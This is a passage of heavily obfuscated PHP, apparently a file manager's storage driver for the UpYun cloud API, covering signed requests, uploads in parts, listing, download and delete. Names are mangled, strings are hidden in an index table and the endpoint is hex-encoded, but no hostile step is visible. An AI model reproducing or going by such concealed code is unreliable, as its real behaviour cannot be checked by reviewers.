_isFolder($Ã¨Ôğ³¨) { $İàÒôûò =& $_SERVER[™»È’øè]; if ($Ã¨Ôğ³¨ == $İàÒôûò[12] || $Ã¨Ôğ³¨ == $İàÒôûò[8]) { return !0; } $÷ûÀ†¡æ = $this->_objectMeta($Ã¨Ôğ³¨); return isset($÷ûÀ†¡æ[$İàÒôûò[33]]) && $÷ûÀ†¡æ[$İàÒôûò[33]] == $İàÒôûò[75] ? !0 : !1; } } goto c‚Âçç­×¾; bãƒ…šÈç½: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ò–Ä“í, $õßª’–Å = 0) { parent::__construct(); $this->source = $Ò–Ä“í; $this->sourceSize = $õßª’–Å; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($„ˆúº = false) { return $this->sourceSize; } public function getContent($‚Ò¯ßÔ = false) { return $this->fileSubstr($‚Ò¯ßÔ, 0, $this->sourceSize); } public function fileSubstr($šÜê½– = false, $©Ë¯Šü = 0, $×¸×Øá¡ = 0) { if (!$×¸×Øá¡) { $×¸×Øá¡ = $this->sourceSize; } $ò±£ŒŞ = $this->sourceSize - $©Ë¯Šü; if ($×¸×Øá¡ >= $ò±£ŒŞ) { $×¸×Øá¡ = $ò±£ŒŞ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $©Ë¯Šü, $×¸×Øá¡); } if ($this->sourceType == self::TYPE_FILE) { if ($×¸×Øá¡ <= 0) { return $_SERVER[™»È’øè][12]; } $¥Ôá¤•¬ = ftell($this->source); fseek_64($this->source, $¥Ôá¤•¬ + $©Ë¯Šü); $”Ã¼Üä = @fread($this->source, $×¸×Øá¡); fseek_64($this->source, $¥Ôá¤•¬); return $”Ã¼Üä; } } public function hashMd5($²ññ—— = false) { return md5($this->getContent()); } public static function hash($â§Í‘—Â, $©Ì©˜éõ = 0) { $ÓÍ—•ÜÉ = new PathDriverStream($â§Í‘—Â, $©Ì©˜éõ); return $ÓÍ—•ÜÉ->hashSimple($â§Í‘—Â); } public static function md5($ˆ¢ªÀÅ÷, $ı†û€„Ñ = 0) { $ÕåÎñ§‚ = new PathDriverStream($ˆ¢ªÀÅ÷, $ı†û€„Ñ); return $ÕåÎñ§‚->hashMd5($ˆ¢ªÀÅ÷); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\57\x2f\x76\x30\56\141\x70\x69\56\x75\160\171\x75\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($êæÅÁÁÇ) { parent::__construct(); $this->_init($êæÅÁÁÇ); } public function _init($…ìšû¨) { $ôÚû÷¡§ =& $_SERVER[™»È’øè]; foreach ($…ìšû¨ as $ï÷ª¹å™ => $ÅÁÒÃê§) { if (isset($this->{$ï÷ª¹å™})) { $this->{$ï÷ª¹å™} = $ÅÁÒÃê§; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ôÚû÷¡§[1467] . LNG($ôÚû÷¡§[1398])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¥Ê¹õ×‹, $Á£õ™„ = "\x47\105\x54") { $÷Â¹ß° =& $_SERVER[™»È’øè]; $óÙ®ù¤ = gmdate($÷Â¹ß°[1431]); $çÜÑÙ–ä = base64_encode(hash_hmac($÷Â¹ß°[1468], "{$Á£õ™„}\x26{$¥Ê¹õ×‹}\x26{$óÙ®ù¤}", md5("{$this->userpass}"), !0)); $”ïüúÁ¶ = array("\x41\165\x74\x68\x6f\162\151\x7a\x61\x74\x69\157\x6e\72\125\120\x59\125\116\40{$this->username}\72{$çÜÑÙ–ä}", "\104\x61\164\x65\72{$óÙ®ù¤}"); return $”ïüúÁ¶; } public function ussRequest($‘²ş‰ê˜, $£êÌ¶à­ = "\107\x45\x54", $¢­úÅŠñ = false, $ŞáÜãñï = false, $æòÁ¢Â¨ = false) { $ÔĞ÷€é =& $_SERVER[™»È’øè]; $‘²ş‰ê˜ = trim($‘²ş‰ê˜, $ÔĞ÷€é[8]); $™«´êÁÏ = "\x2f{$this->bucket}\x2f{$‘²ş‰ê˜}"; $ˆçÁÄ­ì = $this->ussHeaders($™«´êÁÏ, $£êÌ¶à­); if ($ŞáÜãñï) { $ˆçÁÄ­ì = array_merge($ˆçÁÄ­ì, $ŞáÜãñï); } $—ÂŸşµá = url_request($this->endpoint . $™«´êÁÏ, $£êÌ¶à­, $¢­úÅŠñ, $ˆçÁÄ­ì, $æòÁ¢Â¨); if (!$—ÂŸşµá) { return array($ÔĞ÷€é[1242] => !1, $ÔĞ÷€é[1232] => $ÔĞ÷€é[1469]); } if (strtolower($£êÌ¶à­) == $ÔĞ÷€é[210] || in_array($—ÂŸşµá[$ÔĞ÷€é[1242]], array($ÔĞ÷€é[256], $ÔĞ÷€é[1470]))) { $¢­úÅŠñ = $—ÂŸşµá[$ÔĞ÷€é[1471]]; } else { $¢­úÅŠñ = json_decode($—ÂŸşµá[$ÔĞ÷€é[1232]], !0); if (!$¢­úÅŠñ) { $¢­úÅŠñ = $—ÂŸşµá[$ÔĞ÷€é[1232]]; } else { if (!$—ÂŸşµá[$ÔĞ÷€é[775]] && isset($¢­úÅŠñ[$ÔĞ÷€é[1472]])) { $¢­úÅŠñ = $¢­úÅŠñ[$ÔĞ÷€é[1472]]; } } } return array($ÔĞ÷€é[1242] => $—ÂŸşµá[$ÔĞ÷€é[775]], $ÔĞ÷€é[1232] => $¢­úÅŠñ); } public function mkfile($òˆ„³ø, $ô½øÓ = '', $Øü±”ü¾ = REPEAT_RENAME) { if ($this->setContent($òˆ„³ø, $ô½øÓ)) { return $this->getPathOuter($òˆ„³ø); } return !1; } public function mkdir($ä¢ÁµĞÅ, $á¶ƒ©ëõ = REPEAT_SKIP) { $Æ’ ’€Ñ =& $_SERVER[™»È’øè]; $„š½Üß = trim($ä¢ÁµĞÅ, $Æ’ ’€Ñ[8]); if ($this->_isFolder($„š½Üß)) { return $this->getPathOuter($„š½Üß); } $œú´š­¾ = array($Æ’ ’€Ñ[1473]); $¬ÍäÖüŞ = $this->ussRequest($„š½Üß, $Æ’ ’€Ñ[240], !1, $œú´š­¾); return $¬ÍäÖüŞ[$Æ’ ’€Ñ[1242]] ? $this->getPathOuter($„š½Üß) : !1; } public function copyFile($æãÈ¿Ú‰, $Ê‹²¾æ) { $“Üé‚øé =& $_SERVER[™»È’øè]; $Å³¬ùÊ¶ = array($“Üé‚øé[1474] . "\x2f{$this->bucket}\x2f{$æãÈ¿Ú‰}", $“Üé‚øé[1475]); $•ˆÄâ£ = $this->ussRequest($Ê‹²¾æ, $“Üé‚øé[242], !1, $Å³¬ùÊ¶); return $•ˆÄâ£[$“Üé‚øé[1242]] ? !0 : $this->getPathOuter($Ê‹²¾æ); } public function moveFile($ÙÀ±òàè, $¤æ½öŠ) { $ÇĞÕÒŞ¹ =& $_SERVER[™»È’øè]; $¯ÍîÓ™Ô = array($ÇĞÕÒŞ¹[1476] . "\x2f{$this->bucket}\57{$ÙÀ±òàè}", $ÇĞÕÒŞ¹[1475]); $„ÂêãÇë = $this->ussRequest($¤æ½öŠ, $ÇĞÕÒŞ¹[242], !1, $¯ÍîÓ™Ô); return $„ÂêãÇë[$ÇĞÕÒŞ¹[1242]] ? !0 : $this->getPathOuter($¤æ½öŠ); } public function delFile($ê÷ŞÍë) { $”÷°±Ğ¼ =& $_SERVER[™»È’øè]; $Œ”–¿¼Î = $this->ussRequest($ê÷ŞÍë, $”÷°±Ğ¼[1477]); return $Œ”–¿¼Î[$”÷°±Ğ¼[1242]] ? !0 : !1; } public function delFolder($˜ëÃÜ¤é) { $ê—•ã® =& $_SERVER[™»È’øè]; if (!$this->exist($˜ëÃÜ¤é)) { return !0; } $this->listItemCache = !1; $ÉÍ¯·êæ = $³ÏÔì°† = array(); $this->fileList($˜ëÃÜ¤é, $ÉÍ¯·êæ, $³ÏÔì°†, !0); $this->listItemCache = !0; foreach ($³ÏÔì°† as $ÏïèŒõÉ) { $ÆŒñÒå = $this->ussRequest($ÏïèŒõÉ[$ê—•ã®[32]], $ê—•ã®[1477]); if (!$ÆŒñÒå[$ê—•ã®[1242]]) { return !1; } } foreach ($ÉÍ¯·êæ as $Î üÔ“î) { $ÆŒñÒå = $this->ussRequest($Î üÔ“î, $ê—•ã®[1477]); if (!$ÆŒñÒå[$ê—•ã®[1242]]) { return !1; } } $ÆŒñÒå = $this->ussRequest($˜ëÃÜ¤é, $ê—•ã®[1477]); return $ÆŒñÒå[$ê—•ã®[1242]]; } public function rename($¯ğƒ”‡û, $°´õ‡¥) { if ($this->isFile($¯ğƒ”‡û)) { $°´õ‡¥ = get_path_father($¯ğƒ”‡û) . $°´õ‡¥; return $this->moveFile($¯ğƒ”‡û, $°´õ‡¥); } return $this->renameObject($¯ğƒ”‡û, $°´õ‡¥); } public function fileInfo($ÖÔóø™Ù, $ŠßÎ†»ù = false, $ú•´è = array()) { $ñÈ¤â¡Á =& $_SERVER[™»È’øè]; $Ç¿î”Úü = array($ñÈ¤â¡Á[32] => $this->pathThis($ÖÔóø™Ù), $ñÈ¤â¡Á[84] => $this->getPathOuter($ñÈ¤â¡Á[8] . $ÖÔóø™Ù), $ñÈ¤â¡Á[33] => $ñÈ¤â¡Á[213], $ñÈ¤â¡Á[76] => isset($ú•´è[$ñÈ¤â¡Á[76]]) ? $ú•´è[$ñÈ¤â¡Á[76]] : 0, $ñÈ¤â¡Á[174] => $this->ext($ÖÔóø™Ù)); if ($ŠßÎ†»ù) { return $Ç¿î”Úü; } $Ç¿î”Úü[$ñÈ¤â¡Á[214]] = $Ç¿î”Úü[$ñÈ¤â¡Á[85]] = 0; $Ç¿î”Úü[$ñÈ¤â¡Á[215]] = $Ç¿î”Úü[$ñÈ¤â¡Á[216]] = !0; if (empty($ú•´è)) { $ú•´è = $this->objectMeta($ÖÔóø™Ù); if (!$ú•´è) { return $Ç¿î”Úü; } } $Ç¿î”Úü[$ñÈ¤â¡Á[214]] = intval($ú•´è[$ñÈ¤â¡Á[1478]]); $Ç¿î”Úü[$ñÈ¤â¡Á[85]] = intval($ú•´è[$ñÈ¤â¡Á[1479]]); $Ç¿î”Úü[$ñÈ¤â¡Á[76]] = $ú•´è[$ñÈ¤â¡Á[76]]; return $Ç¿î”Úü; } public function folderInfo($†Ìíøˆ‡, $ß¿Ÿ³¦ = false) { $Â½ŠùÔ =& $_SERVER[™»È’øè]; $ğÒàÍä = array($Â½ŠùÔ[32] => $this->pathThis($†Ìíøˆ‡), $Â½ŠùÔ[84] => $this->getPathOuter($Â½ŠùÔ[8] . $†Ìíøˆ‡), $Â½ŠùÔ[33] => $Â½ŠùÔ[75]); if ($ß¿Ÿ³¦) { return $ğÒàÍä; } $ğÒàÍä[$Â½ŠùÔ[214]] = $ğÒàÍä[$Â½ŠùÔ[85]] = 0; $ğÒàÍä[$Â½ŠùÔ[215]] = $ğÒàÍä[$Â½ŠùÔ[216]] = !0; if (empty($ˆ«êÅã¾)) { $ˆ«êÅã¾ = $this->objectMeta($†Ìíøˆ‡); if (!$ˆ«êÅã¾) { return $ğÒàÍä; } } $ğÒàÍä[$Â½ŠùÔ[214]] = intval($ˆ«êÅã¾[$Â½ŠùÔ[1478]]); $ğÒàÍä[$Â½ŠùÔ[85]] = intval($ˆ«êÅã¾[$Â½ŠùÔ[1479]]); return $ğÒàÍä; } private function listObjs($¢…‰ÂèË, $´ãØÉÚé = 0, $ùçÁÁúÉ = 1000) { $¨¢Š¯Àš =& $_SERVER[™»È’øè]; $´ºùµƒõ = array($¨¢Š¯Àš[1480], $¨¢Š¯Àš[1481] . $ùçÁÁúÉ); if ($´ãØÉÚé) { $´ºùµƒõ[] = $¨¢Š¯Àš[1482] . $´ãØÉÚé; } $²‘¬´ø¸ = $this->ussRequest($¢…‰ÂèË, $¨¢Š¯Àš[244], !1, $´ºùµƒõ); return !$²‘¬´ø¸[$¨¢Š¯Àš[1242]] ? !1 : $²‘¬´ø¸[$¨¢Š¯Àš[1232]]; } private function fileList($ùªÛ¦á—, &$©ØÑËÖØ, &$³Ø›Ä‘˜, $„³Óòæå = false) { $‚ççÇ™ƒ =& $_SERVER[™»È’øè]; $ĞŞ«¦¢¢ = $‚ççÇ™ƒ[12]; $ÀÌ×È¡Ô = 1000; $€‹í‚µÙ = rtrim($ùªÛ¦á—, $‚ççÇ™ƒ[8]) . $‚ççÇ™ƒ[8]; while (!0) { check_abort(); $¡ã®‡ß² = $this->listObjs($ùªÛ¦á—, $ĞŞ«¦¢¢, $ÀÌ×È¡Ô); if (!$¡ã®‡ß²) { return !1; } $ĞŞ«¦¢¢ = isset($¡ã®‡ß²[$‚ççÇ™ƒ[1483]]) ? $¡ã®‡ß²[$‚ççÇ™ƒ[1483]] : $‚ççÇ™ƒ[12]; $’Ò‡Ûğå = isset($¡ã®‡ß²[$‚ççÇ™ƒ[1484]]) ? $¡ã®‡ß²[$‚ççÇ™ƒ[1484]] : array(); foreach ($’Ò‡Ûğå as $ø´ŞÄß) { $æœš¸ÀÛ = $ø´ŞÄß[$‚ççÇ™ƒ[33]] == $‚ççÇ™ƒ[75] ? !0 : !1; $Ğì¿ àÄ = ltrim($€‹í‚µÙ . $ø´ŞÄß[$‚ççÇ™ƒ[32]], $‚ççÇ™ƒ[8]) . ($æœš¸ÀÛ ? $‚ççÇ™ƒ[8] : $‚ççÇ™ƒ[12]); $Ëƒ³ú¼ = array($‚ççÇ™ƒ[32] => $Ğì¿ àÄ, $‚ççÇ™ƒ[33] => $æœš¸ÀÛ ? $‚ççÇ™ƒ[75] : $‚ççÇ™ƒ[213], $‚ççÇ™ƒ[76] => $ø´ŞÄß[$‚ççÇ™ƒ[380]], $‚ççÇ™ƒ[1479] => $ø´ŞÄß[$‚ççÇ™ƒ[1485]]); $this->cacheMethodInfoSet($Ğì¿ àÄ, $æœš¸ÀÛ, $Ëƒ³ú¼); if ($æœš¸ÀÛ) { $©ØÑËÖØ[] = $Ğì¿ àÄ; if ($„³Óòæå) { $this->fileList($Ğì¿ àÄ, $©ØÑËÖØ, $³Ø›Ä‘˜, $„³Óòæå); } continue; } $³Ø›Ä‘˜[] = $Ëƒ³ú¼; } if (count($’Ò‡Ûğå) < $ÀÌ×È¡Ô) { break; } } $this->cacheMethodInfoSet($ùªÛ¦á—, !0); } public function listPath($¤±§‹¨, $Ö›­‚ü® = false) { $¬ùæÇÅÉ =& $_SERVER[™»È’øè]; $‹Ø¢Æ¸Œ = $Â°“äÎØ = array(); $this->fileList($¤±§‹¨, $‹Ø¢Æ¸Œ, $Â°“äÎØ); foreach ($‹Ø¢Æ¸Œ as $…ï½ıÖµ => $¬÷ï–Ø³) { $‹Ø¢Æ¸Œ[$…ï½ıÖµ] = $this->folderInfo($¬÷ï–Ø³, $Ö›­‚ü®); } foreach ($Â°“äÎØ as $…ï½ıÖµ => $¬÷ï–Ø³) { $Â°“äÎØ[$…ï½ıÖµ] = $this->fileInfo($¬÷ï–Ø³[$¬ùæÇÅÉ[32]], $Ö›­‚ü®, $¬÷ï–Ø³); } return array($¬ùæÇÅÉ[82] => $‹Ø¢Æ¸Œ, $¬ùæÇÅÉ[83] => $Â°“äÎØ); } public function has($‰áñĞäÜ, $Ù¬¥»Ú = false, $Âßİ”‡É = true) { $Š«¯Èá´ =& $_SERVER[™»È’øè]; $œÚˆŸ¦š = $Š«¯Èá´[12]; $±’Õ…ë§ = 500; $œñ¥ê€ = 0; $Í··”• = 0; $À´µ‡Â = rtrim($‰áñĞäÜ, $Š«¯Èá´[8]) . $Š«¯Èá´[8]; while (!0) { check_abort(); $ÌÆúëÕ« = $this->listObjs($‰áñĞäÜ, $œÚˆŸ¦š, $±’Õ…ë§); if (!$ÌÆúëÕ«) { return !1; } $œÚˆŸ¦š = isset($ÌÆúëÕ«[$Š«¯Èá´[1483]]) ? $ÌÆúëÕ«[$Š«¯Èá´[1483]] : $Š«¯Èá´[12]; $Å€–’Ïî = isset($ÌÆúëÕ«[$Š«¯Èá´[1484]]) ? $ÌÆúëÕ«[$Š«¯Èá´[1484]] : array(); if (empty($Å€–’Ïî)) { break; } $À¡Äø™û = array_filter($Å€–’Ïî, function ($¹¹ŒšÊ¤) { $ŞÄ¦­¹å =& $_SERVER[™»È’øè]; return $¹¹ŒšÊ¤[$ŞÄ¦­¹å[33]] == $ŞÄ¦­¹å[75]; }); $¤‚›ˆøà = count($Å€–’Ïî); $À¡Äø™û = count($À¡Äø™û); $Íù³Ã„‡ = $¤‚›ˆøà - $À¡Äø™û; if ($Ù¬¥»Ú) { $Í··”• += $À¡Äø™û; $œñ¥ê€ += $Íù³Ã„‡; if ($¤‚›ˆøà < $±’Õ…ë§) { break; } continue; } if ($Âßİ”‡É) { if ($Íù³Ã„‡) { return !0; } } else { if ($À¡Äø™û) { return !0; } } if ($¤‚›ˆøà < $±’Õ…ë§) { break; } } if ($Ù¬¥»Ú) { return array($Š«¯Èá´[222] => $œñ¥ê€, $Š«¯Èá´[223] => $Í··”•); } return !1; } public function listAll($¸öÒÖØ¶) { $Àø¿™‡® =& $_SERVER[™»È’øè]; $•Æ¢…Æ² = $ÇÄ‡Ê®¯ = array(); $this->fileList($¸öÒÖØ¶, $•Æ¢…Æ², $ÇÄ‡Ê®¯, !0); $ˆŸ¡Úµå = array_to_keyvalue($ÇÄ‡Ê®¯, $Àø¿™‡®[32]); foreach ($•Æ¢…Æ² as $é¹Õè˜ğ) { if (is_string($é¹Õè˜ğ)) { $ˆŸ¡Úµå[$é¹Õè˜ğ] = array($Àø¿™‡®[76] => 0); } } return $this->listAllFiles($¸öÒÖØ¶, $ˆŸ¡Úµå); } public function canRead($ô‚™•·Â) { return $this->exist($ô‚™•·Â) ? !0 : !1; } public function canWrite($ÀØ„¤¦) { return $this->exist($ÀØ„¤¦) ? !0 : !1; } public function getContent($±¿„ªñ¬) { return $this->fileSubstr($±¿„ªñ¬, 0, -1); } public function setContent($ıã¸³¿Ù, $‰£ıÖÓ = '') { $Ù×ÎŸ¦° =& $_SERVER[™»È’øè]; if (!$‰£ıÖÓ) { $º‘óüÛ‡ = $this->ussRequest($ıã¸³¿Ù, $Ù×ÎŸ¦°[240]); return $º‘óüÛ‡[$Ù×ÎŸ¦°[1242]]; } $½îÂä¼¡ = $this->tempFile($this->pathThis($ıã¸³¿Ù)); file_put_contents($½îÂä¼¡, $‰£ıÖÓ); if ($this->upload($ıã¸³¿Ù, $½îÂä¼¡)) { $this->tempFileRemve($½îÂä¼¡); return !0; } return !1; } public function fileSubstr($ËƒØ•Üñ, $·À¸èÍ, $şó´´Ô) { $íÂ¤ª§ =& $_SERVER[™»È’øè]; if (!($²»°‹§­ = $this->link($ËƒØ•Üñ))) { return !1; } $®Ç¨îã¥ = !1; if ($şó´´Ô > 0) { $™Ì´áƒ™ = $·À¸èÍ + $şó´´Ô - 1; $®Ç¨îã¥ = array($íÂ¤ª§[1446] . $·À¸èÍ . $íÂ¤ª§[429] . $™Ì´áƒ™); } $Ÿ¡²İ‘‡ = url_request($²»°‹§­, $íÂ¤ª§[244], !1, $®Ç¨îã¥); return $Ÿ¡²İ‘‡[$íÂ¤ª§[775]] ? $Ÿ¡²İ‘‡[$íÂ¤ª§[1232]] : !1; } public function upload($¿“ƒØÉ¹, $úø’à¾£, $çà“”‚ = false, $Âè‡§´É = REPEAT_REPLACE) { $ºšÉ¯ô¿ =& $_SERVER[™»È’øè]; $ŒÌáóÄ¬ = IO::size($úø’à¾£); if ($ŒÌáóÄ¬ <= 1024 * 1024 * 200) { $úà¬°– = array($ºšÉ¯ô¿[1486] . $úø’à¾£); $”±® = $this->ussRequest($¿“ƒØÉ¹, $ºšÉ¯ô¿[242], $úà¬°–); return $”±®[$ºšÉ¯ô¿[1242]] ? $this->getPathOuter($¿“ƒØÉ¹) : !1; } $ğÛÆ¡ï = 1024 * 1024 * 10; $Î°ÕÛ°‡ = array($ºšÉ¯ô¿[1487], $ºšÉ¯ô¿[1488] . $ŒÌáóÄ¬, $ºšÉ¯ô¿[1489], $ºšÉ¯ô¿[1490] . $ğÛÆ¡ï); $”±® = $this->ussRequest($¿“ƒØÉ¹, $ºšÉ¯ô¿[242], !1, $Î°ÕÛ°‡); if (!$”±®[$ºšÉ¯ô¿[1242]]) { return !1; } $ÚµøŸó­ = $”±®[$ºšÉ¯ô¿[1232]]; $ú¹¥Ëâã = 0; $àçØùé = $ÚµøŸó­[$ºšÉ¯ô¿[1491]]; $£†£ôø = fopen($úø’à¾£, $ºšÉ¯ô¿[1395]); if (!$£†£ôø) { return !1; } do { $ÊÕƒœÛİ = $ÚµøŸó­[$ºšÉ¯ô¿[1492]]; fseek_64($£†£ôø, $ú¹¥Ëâã); $ÜùÁ¸— = fread($£†£ôø, $ÊÕƒœÛİ); $õ æ¡÷ = 0; do { $õ æ¡÷++; $ÚµøŸó­ = $this->uploadPart($¿“ƒØÉ¹, $ÚµøŸó­, $ÜùÁ¸—); } while (!$ÚµøŸó­ && $õ æ¡÷ < 3); if (!$ÚµøŸó­) { return !1; } $àçØùé = $ÚµøŸó­[$ºšÉ¯ô¿[1491]]; $ú¹¥Ëâã += $ÊÕƒœÛİ; } while ($àçØùé != -1); fclose($£†£ôø); $Î°ÕÛ°‡ = array($ºšÉ¯ô¿[1493], $ºšÉ¯ô¿[1494] . $ÚµøŸó­[$ºšÉ¯ô¿[1495]], $ºšÉ¯ô¿[1489]); $”±® = $this->ussRequest($¿“ƒØÉ¹, $ºšÉ¯ô¿[242], !1, $Î°ÕÛ°‡); return $”±®[$ºšÉ¯ô¿[1242]] ? $this->getPathOuter($¡ØçÚˆ“) : !1; } private function uploadPart($óäùúéÄ, $™“®²Â, &$é¸¡åÖ¥) { $üÈŠ—ğÆ =& $_SERVER[™»È’øè]; $¢û¼”¨š = array($üÈŠ—ğÆ[1496], $üÈŠ—ğÆ[1494] . $™“®²Â[$üÈŠ—ğÆ[1495]], $üÈŠ—ğÆ[1497] . $™“®²Â[$üÈŠ—ğÆ[1491]], $üÈŠ—ğÆ[142] . $™“®²Â[$üÈŠ—ğÆ[1492]]); $Ö¶üˆˆ = $this->ussRequest($óäùúéÄ, $üÈŠ—ğÆ[242], $é¸¡åÖ¥, $¢û¼”¨š); return !$Ö¶üˆˆ[$üÈŠ—ğÆ[1242]] ? $Ö¶üˆˆ[$üÈŠ—ğÆ[1242]] : $Ö¶üˆˆ[$üÈŠ—ğÆ[1232]]; } public function uploadFormData($ë—ìŸˆŞ, $Šãµôç = 3600) { return $this->uploadPolicy($ë—ìŸˆŞ, $Šãµôç); } public function multiUploadFormData($¸·™˜¬›, $õÅÅæ“ = 3600) { $éÏöñÃä =& $_SERVER[™»È’øè]; $œœöºì  = (int) $GLOBALS[$éÏöñÃä[7]][$éÏöñÃä[76]]; return $this->uploadPolicy($¸·™˜¬›, $õÅÅæ“, $œœöºì ); } private function uploadPolicy($šŠ¤‹ç, $ì•ñ†¿´ = 3600, $ŞÍîËè = 0) { $–‘‹µá¢ =& $_SERVER[™»È’øè]; $İÌ›‚’ = $–‘‹µá¢[8] . $this->bucket; $¿·Òºìí = gmdate($–‘‹µá¢[1431]); $Õ•Æ¿Ä¬ = array($–‘‹µá¢[1498] => $this->bucket, $–‘‹µá¢[1499] => $šŠ¤‹ç, $–‘‹µá¢[1500] => time() + $ì•ñ†¿´, $–‘‹µá¢[1501] => $¿·Òºìí); if ($ŞÍîËè) { $Õ•Æ¿Ä¬[$–‘‹µá¢[1412]] = $ŞÍîËè; } $£™‘Å×¬ = base64_encode(json_encode($Õ•Æ¿Ä¬)); $şïÛÉÉİ = base64_encode(hash_hmac($–‘‹µá¢[1468], "\x50\117\x53\x54\46{$İÌ›‚’}\x26{$¿·Òºìí}\46{$£™‘Å×¬}", md5("{$this->userpass}"), !0)); $âÍòõß‘ = array($–‘‹µá¢[275] => $£™‘Å×¬, $–‘‹µá¢[1502] => "\125\120\x59\125\116\40{$this->username}\72{$şïÛÉÉİ}", $–‘‹µá¢[195] => $this->endpoint . $İÌ›‚’); return $âÍòõß‘; } public function download($°‹ØÜü, $º¥¼’æú) { $Àºª„ËÅ = IO::getPathInner(IO::mkfile($º¥¼’æú)); if (!($³È‡¬ÃÍ = $this->link($°‹ØÜü))) { return !1; } $Š„ˆçĞù = 0; $µ„çµÑÇ = 1024 * 200; $ƒ»‰¬ğÊ = fopen($Àºª„ËÅ, $_SERVER[™»È’øè][1452]); while (!0) { $ÉĞëŠŞŒ = $this->fileSubstr($°‹ØÜü, $Š„ˆçĞù, $µ„çµÑÇ); if ($ÉĞëŠŞŒ === !1) { return !1; } fwrite($ƒ»‰¬ğÊ, $ÉĞëŠŞŒ); $Š„ˆçĞù += $µ„çµÑÇ; if (strlen($ÉĞëŠŞŒ) < $µ„çµÑÇ) { break; } } fclose($ƒ»‰¬ğÊ); return $º¥¼’æú; } public function link($Å‘‹³«, $äü™Åå¦ = array()) { $úÒ¯„Š =& $_SERVER[™»È’øè]; $Å‘‹³« = trim($Å‘‹³«, $úÒ¯„Š[8]); if (!empty($this->token)) { $çı¦À÷Ã = strtotime(date($úÒ¯„Š[1503])); $ ˆø–Å = substr(md5($this->token . $úÒ¯„Š[327] . $çı¦À÷Ã . $úÒ¯„Š[1504] . $Å‘‹³«), 12, 8) . $çı¦À÷Ã; $äü™Åå¦[] = $úÒ¯„Š[1505] . $ ˆø–Å; } $ñŠêÂ¶º = !empty($äü™Åå¦) ? $úÒ¯„Š[73] . implode($úÒ¯„Š[327], $äü™Åå¦) : $úÒ¯„Š[12]; return $this->getHost() . $úÒ¯„Š[8] . $Å‘‹³« . $ñŠêÂ¶º; } public function fileOut($¬ÕùŸõ, $ããËíé™ = false, $”¶àî²ä = false, $Ğ¯´Ê¢“ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¬ÕùŸõ, $ããËíé™, $”¶àî²ä, $Ğ¯´Ê¢“); } if (!$”¶àî²ä) { $”¶àî²ä = $this->pathThis($¬ÕùŸõ); } $­âğÍ‰ = $ããËíé™ ? array($_SERVER[™»È’øè][1506] . rawurlencode($”¶àî²ä)) : array(); $ä‰İúÌ² = $this->link($¬ÕùŸõ, $­âğÍ‰); $this->fileOutLink($ä‰İúÌ²); } public function fileOutServer($ö”¡‹å¢, $´œ…–ë = false, $ºé‰ªÇó = false, $Ğê¬°ç• = '') { parent::fileOut($ö”¡‹å¢, $´œ…–ë, $ºé‰ªÇó, $Ğê¬°ç•); } public function fileOutImage($™™Ô»­ˆ, $÷³ø¶ûµ = 250) { $çÆÌáÄ« = $this->link($™™Ô»­ˆ . $_SERVER[™»È’øè][1507] . $÷³ø¶ûµ); $this->fileOutLink($çÆÌáÄ«); } public function fileOutImageServer($öã¡šÏŒ, $ç”ï‹ì¾ = 250) { parent::fileOutImage($öã¡šÏŒ, $ç”ï‹ì¾); } public function hashMd5($–İÃ´„í) { $Ñ÷ïƒ =& $_SERVER[™»È’øè]; $ë“—âÅµ = $this->_objectMeta($–İÃ´„í); return isset($ë“—âÅµ[$Ñ÷ïƒ[227]]) ? $ë“—âÅµ[$Ñ÷ïƒ[227]] : !1; } public function size($âøÅæì) { $ ûã’ªÁ = $this->objectMeta($âøÅæì); return $ ûã’ªÁ ? $ ûã’ªÁ[$_SERVER[™»È’øè][76]] : 0; } public function info($›ÂÊ¿ü) { if ($this->isFolder($›ÂÊ¿ü)) { return $this->folderInfo($›ÂÊ¿ü); } else { if ($this->isFile($›ÂÊ¿ü)) { return $this->fileInfo($›ÂÊ¿ü); } } return !1; } public function exist($÷ò–Î¡Ï) { return $this->isFile($÷ò–Î¡Ï) || $this->isFolder($÷ò–Î¡Ï); } public function isFile($¤á‡¥…ı) { return !$this->isFolder($¤á‡¥…ı) && $this->objectMeta($¤á‡¥…ı); } public function isFolder($÷¢„ŞÖ³) { return $this->cacheMethod($_SERVER[™»È’øè][165], $÷¢„ŞÖ³); } protected function objectMeta($®ÚĞ”ç) { return $this->cacheMethod($_SERVER[™»È’øè][167], $®ÚĞ”ç); } protected function _objectMeta($ö¡ÒÅµœ) { $Ø±Äƒåœ =& $_SERVER[™»È’øè]; if ($ö¡ÒÅµœ == $Ø±Äƒåœ[12] || $ö¡ÒÅµœ == $Ø±Äƒåœ[8]) { return array(); } $£úüèã = $this->ussRequest($ö¡ÒÅµœ, $Ø±Äƒåœ[1508]); if (!$£úüèã[$Ø±Äƒåœ[1242]]) { return null; } $ÛˆĞœƒÊ = isset($£úüèã[$Ø±Äƒåœ[1232]]) ? $£úüèã[$Ø±Äƒåœ[1232]] : array(); if (!isset($ÛˆĞœƒÊ[$Ø±Äƒåœ[1509]])) { return null; } $™®Ë…Œ¾ = array($Ø±Äƒåœ[33] => isset($ÛˆĞœƒÊ[$Ø±Äƒåœ[1509]]) ? $ÛˆĞœƒÊ[$Ø±Äƒåœ[1509]] : null, $Ø±Äƒåœ[76] => isset($ÛˆĞœƒÊ[$Ø±Äƒåœ[1510]]) ? $ÛˆĞœƒÊ[$Ø±Äƒåœ[1510]] : null, $Ø±Äƒåœ[227] => isset($ÛˆĞœƒÊ[$Ø±Äƒåœ[1511]]) ? $ÛˆĞœƒÊ[$Ø±Äƒåœ[1511]] : null, $Ø±Äƒåœ[1478] => isset($ÛˆĞœƒÊ[$Ø±Äƒåœ[1512]]) ? $ÛˆĞœƒÊ[$Ø±Äƒåœ[1512]] : null); $™®Ë…Œ¾[$Ø±Äƒåœ[1479]] = isset($ÛˆĞœƒÊ[$Ø±Äƒåœ[1513]]) ? 